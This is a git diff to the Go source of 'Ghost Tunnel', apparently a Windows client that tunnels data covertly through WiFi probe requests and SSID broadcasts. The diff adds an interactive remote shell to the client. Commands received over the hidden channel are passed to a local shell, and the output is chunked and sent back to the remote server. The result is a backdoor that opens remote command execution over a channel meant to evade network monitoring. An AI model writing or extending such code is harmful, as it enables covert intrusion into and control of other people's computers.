@@ -14,7 +14,8 @@ var (
 
 // WlanAPI call operate system's native WiFi API.
 type WlanAPI interface {
-	SendAndReceive(t *TunnelData) *TunnelData
+	Send(t *TunnelData)
+	Receive() *TunnelData
 }
 
 // GTClient is Ghost Tunnel Windows Client.
@@ -25,6 +26,7 @@ type GTClient struct {
 	serverID  uint8
 	connected bool
 	sendList  *list.List
+	shell     Shell
 }
 
 // New Windows GTClient.
@@ -42,7 +44,7 @@ func (c *GTClient) sendConnReq() {
 		if !c.connected {
 			c.sendList.PushBack(&TunnelData{
 				dataType: TunnelConnClientReq,
-				payload:  string([]byte{0x06}) + name,
+				payload:  append([]byte{0x06}, []byte(name)...),
 			})
 		}
 		time.Sleep(30 * time.Second)
@@ -57,7 +59,7 @@ func (c *GTClient) sendHeartBeat() {
 				dataType: TunnelConnHeartBeat,
 				clientID: c.clientID,
 				serverID: c.serverID,
-				payload:  "",
+				payload:  []byte{},
 			})
 		}
 	}
@@ -68,11 +70,15 @@ func (c *GTClient) handlePacket() {
 		for {
 			if c.sendList.Len() > 0 {
 				v := c.sendList.Front()
-				c.tData <- c.SendAndReceive(v.Value.(*TunnelData))
+				c.Send(v.Value.(*TunnelData))
 				c.sendList.Remove(v)
+				c.tData <- c.Receive()
 				continue
 			}
-			c.tData <- c.SendAndReceive(nil)
+			// make a simple probe-request to refresh ssid list.
+			c.Send(nil)
+			c.tData <- c.Receive()
+
 		}
 	}()
 
@@ -118,27 +124,40 @@ func (c *GTClient) handleShell(t *TunnelData) {
 			dataType: TunnelShellACP,
 			clientID: c.clientID,
 			serverID: c.serverID,
-			payload:  string(acp),
+			payload:  acp,
 		})
-		dir, _ := os.Getwd()
-		c.sendList.PushBack(&TunnelData{
-			dataType: TunnelShellData,
-			clientID: c.clientID,
-			serverID: c.serverID,
-			payload:  dir,
-		})
+
+		c.shell.Init()
+		go func() {
+			for {
+				if res := c.shell.ReadOutput(); len(res) > 0 {
+					// chunk
+					for len(res) > MaxPayloadLength {
+						c.sendList.PushBack(&TunnelData{
+							dataType: TunnelShellData,
+							clientID: c.clientID,
+							serverID: c.serverID,
+							payload:  res[:MaxPayloadLength],
+						})
+						res = res[MaxPayloadLength:]
+					}
+
+					c.sendList.PushBack(&TunnelData{
+						dataType: TunnelShellData,
+						clientID: c.clientID,
+						serverID: c.serverID,
+						payload:  res,
+					})
+				}
+			}
+		}()
+
 	case TunnelShellData:
-		fmt.Println("[*] shell data")
-		fmt.Println(t.payload)
-		dir, _ := os.Getwd()
-		c.sendList.PushBack(&TunnelData{
-			dataType: TunnelShellData,
-			clientID: c.clientID,
-			serverID: c.serverID,
-			payload:  dir,
-		})
+		fmt.Println(string(t.payload))
+		c.shell.Input(string(t.payload) + "\n")
+
 	case TunnelShellQuit:
-		fmt.Println("[*] quit shell")
+		fmt.Println("[*] Quit shell")
 		os.Exit(0)
 	}
 }
@@ -146,6 +165,7 @@ func (c *GTClient) handleShell(t *TunnelData) {
 func (c *GTClient) handleFile(t *TunnelData) {}
 
 func main() {
+	fmt.Println("[*] Start")
 	c := New()
 	if err != nil {
 		fmt.Println(err)
